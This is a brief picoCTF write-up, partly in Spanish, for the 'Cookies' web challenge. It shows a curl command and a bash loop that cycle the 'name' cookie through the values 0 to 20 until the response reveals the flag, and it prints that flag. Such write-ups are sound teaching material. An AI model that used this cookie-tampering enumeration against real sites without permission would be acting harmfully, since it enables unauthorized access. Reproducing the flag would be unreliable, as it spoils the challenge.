## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)
## Solución
```bash
hervi-picoctf@webshell:~$ curl http://mercury.picoctf.net:64944/check -H "Cookie: name=30" | grep "I love"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   209  100   209    0     0  14161      0 --:--:-- --:--:-- --:--:-- 14928
hervi-picoctf@webshell:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>
```
## Notas
Se tiene que modificar la cookie desde la terminal utilizando un _for_ que determine cuales de las cookies contienen dentro de ellas una bandera de nombre "pico".